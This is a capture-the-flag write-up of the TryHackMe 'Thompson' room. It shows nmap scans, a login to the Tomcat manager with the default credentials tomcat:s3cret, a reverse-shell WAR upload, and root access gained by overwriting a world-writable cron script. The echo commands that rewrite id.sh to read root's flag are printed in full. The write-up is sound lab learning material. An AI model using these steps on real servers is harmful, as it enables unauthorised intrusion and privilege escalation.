
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Thompson/images/113-1.png)

In this room i exploited a tomcat server by logging in with the default credentials, then uploading a war file which acted as a reverse shell.

As always, i started enumerating the open ports.

```text
# Nmap 7.80 scan initiated Sun Oct  4 05:41:40 2020 as: nmap -sS -T4 -p- -o full_scan.txt 10.10.188.166
Nmap scan report for 10.10.188.166
Host is up (0.066s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8009/tcp open  ajp13
8080/tcp open  http-proxy

# Nmap done at Sun Oct  4 05:42:40 2020 -- 1 IP address (1 host up) scanned in 60.86 seconds
```

```text
# Nmap 7.80 scan initiated Sun Oct  4 05:44:50 2020 as: nmap -sV -sC -p22,8009,8080 -o full_scan_advanced.txt 10.10.188.166
Nmap scan report for 10.10.188.166
Host is up (0.051s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  4 05:45:09 2020 -- 1 IP address (1 host up) scanned in 20.02 seconds
```
This machine has only 3 ports open and one of them belongs ajp service. This service should not be visible to anyone as there is a known cve which can take advantage of it. 

The page on port 8080 is the default tomcat webpage and to my advantage i was able to login to the manager using the default credentials tomcat:s3cret

Looking at the new page i noticed the deploy field which afterwards was the point of interest.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Thompson/images/113-2.png)

The first step is to generate a reverse shell using msfvenom, then to upload it using the form from the deploy section. To use the exploit it is necessary to start a listener on the specified port and and click on the uploaded file which appeared in the Applications section and below /manager.

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Thompson/images/113-3.png)

I listed the contents of jack's home directory and noticed the flag and 2 files: test.txt and id.sh

```text
tomcat@ubuntu:/home/jack$ ls -la
ls -la
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Oct  4 03:00 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
```

This file is a script which executes the command id and redirects the output to test.txt
```text
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt
```

Here is the output.

```text
tomcat@ubuntu:/home/jack$ cat test.txt
cat test.txt
uid=0(root) gid=0(root) groups=0(root)

```

The id.sh is a bash script which, looking at the /etc/crontab file, runs as root, and the result of the commands is in the test.txt file.

```text
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
#
```

In this case i used the echo command to overwrite the id.sh file, as i wanted to just read the read, not to become root. I could have became root by reading the /etc/shadow file and cracking the hash or by echoing a reverse shell payload in the id.sh script.

```bash
echo '#!/bin/bash' > id.sh
echo 'cat /root/root.txt > test.txt' >> id.sh
```
